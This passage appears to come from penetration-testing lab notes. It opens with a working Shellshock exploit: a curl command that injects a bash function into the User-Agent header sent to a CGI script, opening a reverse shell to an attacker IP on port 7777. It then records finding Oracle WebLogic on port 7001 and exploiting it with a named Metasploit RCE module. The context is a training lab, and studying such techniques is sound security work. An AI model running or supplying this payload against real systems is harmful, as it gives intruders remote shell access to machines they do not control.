curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```
## Other Notable Applications

***LAB Notes:*

- Found `Oracle WebLogic admin httpd 12.2.1.3 (T3 enabled)` on port 7001.
- Used Metasploit module `exploit/multi/http/weblogic_admin_handle_rce` to exploit
